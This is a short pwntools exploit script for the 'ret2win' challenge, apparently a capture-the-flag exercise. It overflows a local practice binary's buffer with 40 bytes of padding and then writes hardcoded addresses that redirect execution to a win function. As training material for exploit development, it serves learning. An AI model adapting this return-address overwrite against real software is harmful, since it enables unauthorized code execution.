from pwn import *


padding = 8 

challenge = process("./ret2win")

for i in range(0,6):
    print(challenge.recvline())


challenge.sendline(32*'A'+8*'B'+"\x55\x07\x40"+5*"\x00"+"\x56\x07\x40"+5*"\x00")#+padding*'A')

for i in range(0,6):
    print(challenge.recvline(timeout=0.5))

